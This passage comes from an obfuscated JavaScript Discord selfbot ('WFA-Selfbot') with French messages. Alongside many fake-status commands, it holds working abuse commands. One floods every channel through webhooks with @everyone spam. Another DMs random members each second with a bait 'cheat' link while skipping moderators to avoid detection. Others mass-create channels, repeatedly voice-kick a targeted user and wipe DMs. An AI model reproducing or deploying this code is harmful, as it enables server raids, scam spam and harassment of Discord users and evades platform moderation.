        if (!_0x343bx50["member"]["hasPermission"]("MANAGE_CHANNELS")) {
            return _0x343bx50["edit"](":x: **Vous n'avez pas les permissions pour executer cette commande**")
        };
        _0x343bx50["delete"]();
        for (let _0x343bx5a = 0; _0x343bx5a < 20; _0x343bx5a++) {
            _0x343bx50["guild"]["createChannel"](`WFA-𝐱-${client["user"]["username"]}`, "text")["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        };
        console["log"]("Commande create channel executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "start typing")) {
        _0x343bx50["delete"]();
        _0x343bx50["channel"]["startTyping"]();
        console["log"]("Commande start typing executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "webhook spam")) {
        let _0x343bx5c = _0x343bx56["splice"](2)["join"](" ") || "@everyone\nWFA\nhttps://discord.gg/wUw8ZH7849";
        if (_0x343bx50["channel"]["type"] === 'dm' || _0x343bx50["channel"]["type"] === 'group') {
            return _0x343bx50["edit"](':x: **Commande uniquement utilisable sur serveur**.')
        };
        if (!_0x343bx50["member"]["hasPermission"]('MANAGE_WEBHOOKS')) {
            return
        };
        _0x343bx50["guild"]["channels"]["forEach"]((_0x343bx5d) => {
            if (!_0x343bx5d) {
                return
            };
            if (_0x343bx5d["type"] == 'text') {
                _0x343bx5d["createWebhook"]("Delta-Selfbot", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXOybiPRVaDnYzQz9gA3ijBLfJFoxw_4zb9w&usqp=CAU")["catch"]((_0x343bx5b) => {
                    return console["log"]('[', 'ERROR' ["red"], ']', 'une erreur est survenue que je ne peux régler' ["green"])
                })
            }
        });
        let _0x343bx5e = setInterval(async function () {
            await _0x343bx50["guild"]["fetchWebhooks"]()["then"]((_0x343bx5f) => {
                return _0x343bx5f["forEach"]((_0x343bx60) => {
                    return _0x343bx60["send"](_0x343bx5c)["catch"]((_0x343bx5b) => {
                        return console["log"]('[', 'ERROR' ["red"], ']', 'une erreur est survenue que je ne peux régler' ["green"])
                    })
                })
            })
        });
        console["log"]("Commande webhook spam executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "branlette")) {
        _0x343bx50["edit"]("8=:fist:=x3DD ");
        _0x343bx50["edit"]("8=x3D:fist:=D ");
        _0x343bx50["edit"]("8=x3D=:fist:D ");
        _0x343bx50["edit"]("8=x3D:fist:=D ");
        _0x343bx50["edit"]("8=:fist:=x3DD ");
        _0x343bx50["edit"]("8:fist:=x3D=D ");
        _0x343bx50["edit"]("8=:fist:=x3DD ");
        _0x343bx50["edit"]("8=x3D:fist:=D ");
        _0x343bx50["edit"]("8=x3D=:fist:D ");
        _0x343bx50["edit"]("8=x3D:fist:=D:sweat_drops: ");
        _0x343bx50["edit"]("8=x3D=:fist:D:sweat_drops: ");
        console["log"]("Commande branlette executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "mp all")) {
        if (!_0x343bx50["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur serveur**")
        };
        _0x343bx50["delete"]();
        console["log"]("Commande mp all executé." ["yellow"]);
        let _0x343bx61 = 0;
        let _0x343bx62 = _0x343bx56["splice"](2)["join"](" ") || "**Best counter strike cheat 100% work** \nhttps://youtu.be/7817Q-MGmbg";
        let _0x343bx63 = _0x343bx50["guild"];
        if (!_0x343bx63) {
            return
        };
        setInterval(() => {
            let _0x343bx64 = _0x343bx63["members"]["random"]();
            if (_0x343bx64["user"]["bot"]) {
                return
            };
            if (_0x343bx64["user"]["id"] === client["user"]["id"]) {
                return
            };
            if (_0x343bx64["hasPermission"]("ADMINISTRATOR")) {
                return
            };
            if (_0x343bx64["hasPermission"]("MANAGE_MESSAGES")) {
                return
            };
            if (_0x343bx64["hasPermission"]("MANAGE_ROLES_OR_PERMISSIONS")) {
                return
            };
            if (_0x343bx64["hasPermission"]("BAN_MEMBERS")) {
                return
            };
            if (db[_0x343bx64["user"]["id"]]) {
                return
            };
            _0x343bx61++;
            _0x343bx64["send"]("Hello ^^")["then"]((_0x343bx65) => {
                return _0x343bx65["edit"](_0x343bx62)
            })["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("[MP Envoyé]  |" + _0x343bx64["user"]["username"]["green"] + `|  ${_0x343bx61} / ${_0x343bx55["guild"]["members"]["filter"]((_0x343bx65)=>{return _0x343bx65["presence"]["status"]!== "offline"})["size"]} `);
            db[_0x343bx64["user"]["id"]] = {
                raison: "mp"
            };
            saver()
        }, 1000)
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "stop mp all")) {
        client["destroy"]()["then"](() => {
            return client["login"](token)
        });
        console["log"]("Commande mp all stopé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "auto voice kick")) {
        if (!_0x343bx50["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur serveur**")
        };
        if (!_0x343bx50["guild"]["me"]["hasPermission"]("MOVE_MEMBERS")) {
            return _0x343bx50["reply"](":x:**Tu n'a pas la permission de kick un utilisatur**.")
        };
        const _0x343bx66 = _0x343bx50["mentions"]["members"]["first"]();
        if (!_0x343bx66) {
            return _0x343bx50["edit"](":x:**Veuillez mentionner un utilisateur.**")
        };
        kicked[_0x343bx50["guild"]["id"]] = {
            user: _0x343bx66["id"]
        };
        kicker();
        console["log"]("Commande auto voice kick executé." ["yellow"]);
        _0x343bx50["edit"](":white_check_mark: **Auto Voice kick setup l'utilisateur ne pourra plus rejoindre de channel vocal de ce serveur**");
        _0x343bx66["setVoiceChannel"](null)["catch"]((_0x343bx5b) => {
            return _0x343bx50["edit"](":x:**L'utilisateur n'est pas dans un channel vocal.**")
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "stop auto voice kick")) {
        if (!_0x343bx50["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur serveur**")
        };
        const _0x343bx66 = _0x343bx50["mentions"]["members"]["first"]();
        if (!_0x343bx66) {
            return _0x343bx50["edit"](":x:**Veuillez mentionner un utilisateur.**")
        };
        delete kicked[_0x343bx50["guild"]["id"]]["user"];
        kicker();
        _0x343bx50["edit"](":white_check_mark: **Auto Voice kick set up l'utilisateur ne peut desormé rejoindre les channels vocaux de ce serveur**");
        console["log"]("Commande auto voice kick stopé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "voice kick")) {
        if (!_0x343bx50["guild"]) {
            return _0x343bx50["edit"](":x: **Commande uniquement utilisable sur serveur**")
        };
        if (!_0x343bx50["guild"]["me"]["hasPermission"]("MOVE_MEMBERS")) {
            return _0x343bx50["reply"](":x:**Tu n'a pas la permission de kick un utilisatur**.")
        };
        const _0x343bx66 = _0x343bx50["mentions"]["members"]["first"]();
        if (!_0x343bx66) {
            return _0x343bx50["edit"](":x:**Veuillez mentionner un utilisateur.**")
        };
        if (!_0x343bx66["voiceChannel"]) {
            return _0x343bx50["edit"](":x:**L'utilisateur n'est pas dans un channel vocal.**")
        };
        _0x343bx66["setVoiceChannel"](null)["catch"]((_0x343bx5b) => {
            return _0x343bx50["edit"](":x:**L'utilisateur n'est pas dans un channel vocal.**")
        });
        _0x343bx50["edit"](":white_check_mark: **L'utilisateur a été voice kick correctement**");
        console["log"]("Commande voice kick executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "afk")) {
        let _0x343bx67 = _0x343bx56["splice"](1)["join"](" ") || "@everyone\nWFA-SELFBOT\nhttps://discord.gg/wUw8ZH7849";
        afk[client["user"]["id"]] = {
            activé: "oui",
            r: _0x343bx67
        };
        saving();
        _0x343bx50["edit"](":white_check_mark: **Vous etes afk pour** " + _0x343bx67);
        console["log"]("Commande afk executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "gucci")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "gucci")["then"]((_0x343bx41) => {
            rpcGenerator["getRpcImage"]("603405368940429315", "gucci0")["then"]((_0x343bx42) => {
                let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Gucci")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Gucci")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsSmallImage"](_0x343bx42["id"])["setAssetsLargeText"]("BE RICH WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                    id: uuid()
                });
                client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
                console["log"]("Commande Gucci executé" ["yellow"]);
                _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Gucci**`)
            })
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "lacoste")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "lacoste")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Lacoste")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Lacoste")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE RAKAILLE WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande lacoste executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur lacoste**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "nike")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "nike")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Nike")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Nike")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE NIKED WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Nike executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Nike**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "google")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "google")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Google")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Google")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE INSTRUCT WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande google executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur google**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "skype")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "skype")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Skype")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Skype")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE OLD WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Skype executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Skype**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "snapchat")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "snapchat")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Snapchat")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Snapchat")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE YOUNG WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Snapchat executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Snapchat**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "facebook")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "facebook")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Facebook")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Skype")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE MORE OLD WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Facebook executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Facebook**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "nuke dm")) {
        let _0x343bx69 = "";
        _0x343bx50["edit"]("**Nuking dms...**");
        client["users"]["forEach"]((_0x343bx3f) => {
            return _0x343bx3f["deleteDM"]()["catch"]((_0x343bx69 = "zebi"))
        });
        _0x343bx50["edit"](":white_check_mark: **Nuked dms**");
        console["log"](`Commande nuke dm exectué` ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "tiktok")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "tiktok")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Tiktok")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Tiktok")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE A PUTE WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Tiktok executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Tiktok**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "twitter")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "twitter")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Twitter")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Twitter")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE A E-FUCKER WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Twitter executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Twitter**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "instagram")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "instagram")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Instagram")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Instagram")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE INFLUENCER WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Instagram executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Instagram**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "youtube")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "youtube")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Youtube")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Youtube")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("BE YOUTUBER WITH WFA")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Youtube executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Youtube**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "tokyo ghoul")) {
        let _0x343bx68 = _0x343bx56["splice"](2)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "tokyo")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Tokyo Ghoul")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Tokyo Ghoul")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Tokyo Ghoul executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Tokyo Ghoul**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "hunter x hunter")) {
        let _0x343bx68 = _0x343bx56["splice"](3)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "hxh")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Hunter X Hunter")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Hunter X Hunter")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Hunter X Hunter executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Hunter X Hunter**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "naruto")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("721465320740487179", "naruto")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Naruto")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("721465320740487179")["setDetails"]("Naruto")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Naruto executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Naruto**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "pornhub")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "pornhub")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Pornhub")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("WATCHING")["setApplicationId"]("603405368940429315")["setDetails"]("Pornhub")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Pornhub executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu regardes ${_0x343bx68} sur Pornhub**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "clash of clan")) {
        let _0x343bx68 = _0x343bx56["splice"](3)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("721465320740487179", "clash-of-clans-app-icon")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Clash Of Clan")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("721465320740487179")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Clash Of Clan executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur Clash Of Clan**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "minecraft")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "minecraft")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Minecraft")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Minecraft executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur Minecraft**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "clash royal")) {
        let _0x343bx68 = _0x343bx56["splice"](2)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "clashroyal")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Clash Royal")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot E")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Clash Royal executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur Clash Royal**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "tinder")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "tinder")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Tinder")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Tinder executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur Tinder**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "roblox")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "roblox")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Roblox")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Roblox executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur Roblox**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "badlion")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "badlion")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Badlion")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Badlion executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur Badlion**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "apex")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "apex")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Apex Legends")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande Apex Legends executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur Apex Legends**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "csgo")) {
        let _0x343bx68 = _0x343bx56["splice"](1)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "csgo")["then"]((_0x343bx41) => {
            let _0x343bx43 = new rpcGenerator.Rpc()["setName"]("Counter Strike")["setUrl"]("https://www.twitch.tv/OGAGAL_risitas")["setType"]("PLAYING")["setApplicationId"]("603405368940429315")["setDetails"]("WFA Selfbot")["setAssetsLargeImage"](_0x343bx41["id"])["setAssetsLargeText"]("WFA-Selfbot")["setState"](_0x343bx68)["setStartTimestamp"](Date["now"]())["setParty"]({
                id: uuid()
            });
            client["user"]["setPresence"](_0x343bx43["toDiscord"]())["catch"](console["error"]);
            console["log"]("Commande csgo executé" ["yellow"]);
            _0x343bx50["edit"](`:white_check_mark: **Tu joues à ${_0x343bx68} sur csgo**`)
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "among us")) {
        let _0x343bx68 = _0x343bx56["splice"](2)["join"](" ") || "WFA-Selfbot";
        rpcGenerator["getRpcImage"]("603405368940429315", "amongus")["then"]((_0x343bx41) => {
